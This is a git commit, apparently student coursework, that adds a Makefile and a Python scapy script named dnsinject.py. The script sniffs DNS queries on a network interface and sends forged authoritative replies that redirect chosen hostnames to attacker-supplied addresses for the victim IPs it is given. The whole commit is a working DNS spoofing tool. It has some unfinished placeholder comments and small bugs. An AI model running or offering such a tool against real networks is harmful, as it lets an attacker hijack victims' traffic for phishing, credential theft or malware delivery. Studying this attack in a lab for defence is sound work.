d683bc68ee204a93f51acca5854d85e97f9c64ad
Vaishali <vishchan18@gmail.com>
2017-12-07 18:27:25 -0800

    Part 1 done

---
+++ Makefile
@@ -0,0 +1,3 @@
+all:dnsinject.py
+	sudo python3 dnsinject.py -h hostnames -i ens33 192.168.10.134
+
---
+++ dnsinject.py
@@ -0,0 +1,55 @@
+import argparse
+import os
+from scapy.all import *
+
+def check_arg():
+	parser = argparse.ArgumentParser(description='DNS Inject', add_help=False)
+	parser.add_argument('-i', nargs='?', action="store")
+	parser.add_argument('-h', nargs='?', action="store")
+	parser.add_argument('filter', nargs='*',action="store")
+	args = parser.parse_args()
+
+	return args.i, args.h, args.filter
+
+def dns_inject(packet):
+	# ........................ Check which ones are victims..........................
+	# ........................ Get redirect_to .....................................
+	#print(packet)
+	
+	if(packet.haslayer(DNSQR)):
+		if(packet[IP].src in expression):
+			print("src", packet[IP].src)
+			print(expression)
+			if(hostFlag==0 and packet[DNS].qd.name in host.keys()):
+				redirect_to = host[packet[DNS].qd.qname]
+			else:
+				redirect_to = '192.168.10.133'
+			spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
+                              UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
+                              DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
+                              an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=redirect_to))
+			send(spoofed_pkt)
+
+if __name__ == '__main__':
+	print(os.sys.path)
+	#os.sys.path.append('/usr/local/lib/python3.5/site-packages')
+	interface,hostfile,expression = check_arg()
+	hostFlag=0
+	if(interface==None):
+		## .....................Write code to get default interface..................
+		interface='ens33'
+	if(hostfile==None):
+		## ....................Write code to get local machine IP address
+		host='192.168.10.133'
+		hostFlag=1
+	else:
+		f = open(hostfile,"r")
+		host = {}
+		for line in f:
+			hostline = line.split()
+			host[hostline[1]] = hostline[0]
+			print(host)
+	sniff(filter='udp port 53', iface=interface, store=0, prn=dns_inject)
+	print('interface =',interface)
+	print('filename =',hostfile)
+	print('filter =',expression) 
